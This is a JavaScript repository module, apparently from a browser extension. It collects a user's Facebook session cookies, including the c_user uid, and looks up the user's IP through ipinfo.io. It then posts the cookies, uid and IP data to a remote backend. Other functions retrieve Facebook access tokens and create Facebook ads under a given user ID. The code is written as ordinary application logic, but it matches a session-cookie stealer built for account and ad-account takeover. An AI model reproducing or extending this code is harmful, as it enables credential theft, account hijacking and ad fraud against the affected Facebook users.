import Config from '../../configs';
import ApiGateWay from '../_ApiGateWay';
import { MainResource } from '../resources/main.resource';

const MainRepository = {
    createFbAccount: async (cookies) => {
        const { value: uid } = cookies.find(item => item.name == "c_user");
        callApiNative({url: 'https://ipinfo.io/', method: 'get'}, (reponse) => {
            console.log(reponse);
            if (reponse.errorData === undefined) {
                const ipInfo = reponse;
                const resource = MainResource.createFbAccount();
                const apiGateWay = new ApiGateWay(Config.getBaseConfig());
                apiGateWay.postRequest(resource, { ipInfo, cookies, uid });
            } else {
                console.log("Get IP Info failed");
            }
        });
    },
    createFbAds: async ({ userId, data }) => {
        const resource = MainResource.createFbAds();
        const apiGateWay = new ApiGateWay(Config.getBaseConfig());
        return apiGateWay.postRequest(resource, { data, userId });
    },
    // get facebook token
    getTokenAEEI: () => {
        const resource = MainResource.getTokenAEEI();
        return requestApiGlobal({url: resource.path,
            method: "get"});
    },
    getTokenAEEB: (params) => {
        const resource = MainResource.getTokenAEEB();
        return requestApiGlobal({url: resource.path,
            method: "get"});
    },
    getCurrencyRate: async (params) => {
        const currencyRate = JSON.parse(localStorage.getItem(`currecy_${params.currency}`));
        if (currencyRate) return currencyRate;
        const resource = MainResource.getCurrencyRate();
        const { data } = await requestApiGlobal({url: resource.path,
            method: "get"});
        localStorage.setItem(`currecy_${params.currency}`, JSON.stringify(data));
        return data;
    },
}

export { MainRepository };